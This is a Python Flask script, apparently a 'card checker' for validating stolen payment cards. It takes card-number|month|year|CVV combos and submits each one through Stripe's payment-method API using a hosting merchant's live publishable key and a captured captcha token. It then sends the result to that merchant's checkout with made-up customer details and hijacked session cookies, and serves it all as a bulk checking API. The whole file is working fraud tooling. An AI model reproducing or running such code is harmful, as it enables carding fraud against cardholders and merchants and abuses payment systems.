import requests
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify

app = Flask(__name__)

executor = ThreadPoolExecutor(max_workers=5)


headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

cookies = {
    'WHMCSy551iLvnhYt7': '8ca8a4c665c9ec28eab1f8221ad4101d',
    '_fbp': 'fb.1.1769757795735.772366065144413707',
    '__zlcmid': '1VroFkzAJVG59We',
    '__stripe_mid': '5330d896-1e8d-4606-a930-c28209c4f3e148b5e0',
    '__stripe_sid': '8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f',
    'ph_phc_V4kxp7RWacpQcqkBu4PN1BicIOKeaoGNi9dRyIo0IEm_posthog': '%7B%22%24device_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22distinct_id%22%3A%22019c0dc8-e4b9-7bdc-9a0e-9c1e067e64c5%22%2C%22%24sesid%22%3A%5B1769758005700%2C%22019c0dc8-e4d0-74c1-b7c1-be1502450835%22%2C1769757795531%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Fmy.hostarmada.com%2Fclientarea.php%22%7D%7D',
}

def check_card(combo):

    parts = combo.split('|')

    if len(parts) < 4:
        return "Invalid format"

    cc = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvv = parts[3]

    data =  f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b7547fec-aaeb-43cf-86ac-2d11a91f66ed6e4605&muid=5330d896-1e8d-4606-a930-c28209c4f3e148b5e0&sid=8fc0309c-0967-4bc6-b6ad-962a97b2ff618f802f&pasted_fields=number&payment_user_agent=stripe.js%2Fa10732936b%3B+stripe-js-v3%2Fa10732936b%3B+split-card-element&referrer=https%3A%2F%2Fmy.hostarmada.com&time_on_page=31195&client_attribution_metadata[client_session_id]=95e52ab3-0593-4948-ad52-791d58fd71f2&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_sZwZsvPzNPvgqldQYmY5QWhE00B8Wlf3Tx&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzY5NzU4MTAyLCJjZGF0YSI6Ikp5dW0wUC9GRjQvY00zSzI2dndGYWpIMUsrUk9sNlhBdVVEbDdsVXhudSt3MVhvMTUvM2lqOU1xS1lSU1JBcTZhYzlLMVgxTEpkcit5cHN1WEN5QVRNa2wyYW5JUDNJSEM2OEtDcTFLaGlBZE9QMWtsQzh5cElwbURNaVlrUlJsV0ZOUkZ6R3M4TXFMRzVRbWVFL08ydmtyQTJtdlV0eGJvWlRKMmlSQU12SEdlcyt2OWQ2N0tJcFNidG9VSWR5NDNxWWtWT1JFait1OEdEWHlrV2ZsL0ZlUzJlQmpwbXJ4ZlFCL2pRM0dhNGxRZW9WMEUrYWVTdXNkNzRyRTQ3Z3Y5S2pLYVN1K1dDSXBVdXVtZVhCODFNWU54UURlY1B3Smlkb0ZzNkhFdHM1bXRrWjEwNTdjdHFuYkVLUWVOZGRSWmN2MG9kb2ZHdG4xTDRNczg1YWF1N3kvTkZjTzBodnYwRHJuRHBiUVdJOD1sSExMUUp1VEtkVnZVYXJFIiwicGFzc2tleSI6IjN4bHRaS2d2elFHdnpmK2pLRWFhbmx3MHhsb0xKbVBpYVU0SVBtcittTGh2bHhNc25iUHpFUG5kY0RoT1E0L1VNcW1OOW1SSjFqUWRWWVBycW9QSmVCR0JJSEZkUU9tRkl6ZnZaZ0ZVNEJFVWdGZThoUU1tQXFuQUk5enhZYTM3Z3ROWGt4Y0FlUEE3OWZQaDVGOWJ4QmRyTW9mYzdIcTRaNUVqZFp4U3k1d2YxZGNscWJBS292UUYvK1hYT2JqMUZhaFF6emdXaUFDRDBxVWxkdmJDK0k4STVXQmJSdTVLSUJueHhWWUxBc0NzK3VaV3pYSHFwQXY1d3hPRnNvaDloQzZkcmlpNVplanV3M3dZN0Y5RndJYm1XVWlyaUxJZGU0VGRhb2hsTXlHQnl0QVk3YVBBb1lYem83bkhOaW52eVpuZ2F3OS9KekVJSEJXeEZFZWFCOG9uVGhGR0JNOXB6OVhkUkRCWkdWWFBwR1ZuQlBDM3dwQ0V6SGowVlZ6TkNTVGhDd0kva293Vng1dFhEUFZaTzVwUEV3Z0NqS1laZXk1a3FNY0hFVHR4VlZQM05XbkRKSlFRY2QrQk8zN3Jwc1lYRjEvRWhrT25uangwR0hlWGcvQWJrMy95eVBkTEl3NmtweG9yTHJLRCtxRmNYUit2dDFya2NMbzVGL0M5dkZlbEJIbEFJRVhicnlQZjQwZ3U3c2lTc1BZTkt2YWFkYzJkTDJTYWRERyt3S2ZlaTBXSDZXRXZlZzVDSDdKTzc5T3FsRnhqNzdTd01Yc2l1M04xTC8zZUVYc3ZDdUVaUDhIRmcxRUo0cTFSS0RFZWV1SlErOTAxT0p1UEc4NFRwenJUcWJVVTQvUGF3RHJjWmg3b3ZvK1o1biszM2wzaE1UeFlIV3E4bnNoQXlVd2RHRVF4SjFmczc0M2VIQlVueGdCZzRlR2VGNDB0eDhac1d5V1NyUjVCcGh4eVhoZEZad05ibW4zcjNrUkNGRWludVpGWGZSdU9kVE1oTGRnRXI3aDBFbmFHaFkwczNhUlNMdGNhRUFMSTlreVNnWS93Uk1qUWhJZmJzWG9YMFY3MndpV1JuRGdXT2NkeW01LzVXbGluWVpzRUw5RnRPMTFZVE03REtqUVowL2svSEFVQnVTNUV0YjRMa2RIZmFtazk5LzdSMDgyY0h5RnQrSE9GTkhBWXBTSHgvZkJCL2Z2Q3VmZnpsWm9TNlRtYlErRTZhTWNVY1F5bnVVNjZPN1ZsOHN6U0pmdkhWdzJKbER5VEJyKzB6WHlIK3Z5SGl3eGs0bHdFd2liNys3ZXNrNmQzQjN4ZW1Gd0RiZnlNSW5nRDZHSzR5YVhTWGRBRE1FM1pxOS84Lzh6eUhjNjRqNjdoTTRUNy9iUTUyY050UjFzY2J0K3ZoLzNpY2RvTmpNZHpmN2pWMlRoaGs1V1p4YU1MYnpORllOSHNoMUM1YkI1ZVoyR0lZM3NRVUt4MWhlcVhYUEI5b3hCSDlEd2IyMTh5SWg3QXYrUVdQY2JSQ2RQbGxLeFcwTkRQOENjMXlpeTFHcEhFQVhTTzcxMlBOVmVWLy8zdlA2ZitlT1dxMm1IcXlhc0dWaWxyTWJDL2lQcEZObDJqNW1BM2N4NnRVMEpkL3pWOWJXUG54OGtsQm1qVkE5WDVsbktuaHJMa2FtRHN1QWRsckRlNmZweTZnMC90K1hub2dzUE1DTElldHE2M3BZTDcxb1J2WTV5MldZV082YUNvWncyZlFJaFJ1OSt6aUloWWN1M1dJTnhleTdJUmZXdE1MRVRtZ1U5aXhMVjR4anhYd0hwaEVyazdWQUdCZGk3SVNCenkydnI2RWorOXJmdmpnR01CRFpHbm9JaHVuanpOc1JGRGZxajUyUERVYUFXM2M5YlcycTJQcVJ0dXhMdHRGVmJyMENTSEZTSzZvUXdsRVBQSGh0VTVvRE1nWTBlTFVveHdRRHk5YStnczYwdXprODJNNmVNUllMWVZ6bnV6YjdieXYrd2ozRFh3Znpod01Pc0xZOUFKNGhQWy8vZDFqdEMxSDBnSFBzVmZXZzFBcDFnMmRSY3doYjF5a1dISUp4b3QrK2pjUVVSUHV6SEdaUDN3V2M3T2tYdFN3cTh5b2xhQWxHR2o0SXRUZ2dRbzZIRERUTVJQVDkyaFYzVDhsNlFjM2NjMUR5VmNUYkY4Zk5aOWI1anJudzNvbkxlTGpuODU2KytBNkUzWkFPNEV2b3VJOHBQa0xKREM5cWk1bVl4NVk1SkJicFNkTTFNR21yOGVCUHFwWnltd25mN0c5RlBHQ2xrbTRySTZubGhFbWM0emp3dlV1MWo3VDNVUVJBM1ZGZnk4bWlzVjJROEVWeDUrUkxmeEI0M05wYlcwZlRNQVVRSmR6T2lhS2daQzhsOXVrRlFoQ1dxTnNvR2tIK2ZwNEk3TVNyanVabWFUZFVJby9mTENZR1A2Qys5T2JienZLejlNcG43U1l5UHNDbzBQQU11dEdJUC9zeVJkcmtyTDlWRFp5TkduTnlLWTRaS0luTEY0ZFBYQ05qbExuM1dyUTVuZnBQdmora3hXS0xoTlowdnB1RWwvbjZPUDBIOG1NM2M9Iiwia3IiOiJmMWJjMWQ3Iiwic2hhcmRfaWQiOjUzNTc2NTU5fQ.KGZfUKy-8Mz67nDEpL-5m_UiV1ar0NXnRuGUsrrkmf8'

    response = requests.post(
        'https://api.stripe.com/v1/payment_methods',
        headers=headers,
        data=data
    )

    try:
        payment_id = response.json()['id']
    except:
        return f"{cc}|{mm}|{yy}|{cvv} - Invalid card"
    
    headers2 = {
        'authority': 'my.hostarmada.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://my.hostarmada.com',
        'referer': 'https://my.hostarmada.com/cart.php?a=checkout',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data2 = {
        'token': '5657f42085350cb956addb77da8cea663100c2ab',
        'submit': 'true',
        'custtype': 'new',
        'loginemail': '',
        'loginpassword': '',
        'firstname': 'Tommy',
        'lastname': 'K2itm',
        'email': 'Tommy@gmail.com',
        'phonenumber': '315401313',
        'password': 'Pedro1234',
        'password2': 'Pedro1234',
        'country': 'US',
        'state': 'New York',
        'address1': '402 California Avenue',
        'address2': 'suite 2910',
        'city': 'Bakersfield',
        'companyname': 'Enzo',
        'postcode': '10080',
        'paymentmethod': 'stripe',
        'accordion-2': 'on',
        'ccinfo': 'new',
        'validatepromo': '0',
        'promocode': '',
        'accepttos': 'on',
        'payment_method_id': payment_id,
    }

    response2 = requests.post(
        'https://my.hostarmada.com/index.php?rp=/stripe/payment/intent',
        cookies=cookies,
        headers=headers2,
        data=data2,
    )
    
    result = response2.json()

    if 'warning' in result:
        return f"{cc}|{mm}|{yy}|{cvv} - {result['warning']}"
    else:
        return f"{cc}|{mm}|{yy}|{cvv} - {result}"


@app.route("/check", methods=["POST"])
def api():

    data = request.get_json()

    if not data or "combo" not in data:
        return jsonify({"error": "combo missing"})

    combo = data["combo"]

    # THREAD EXECUTOR
    future = executor.submit(check_card, combo)
    result = future.result()

    return jsonify({"result": result})


# RUN SERVER
app.run(host="0.0.0.0", port=5000)
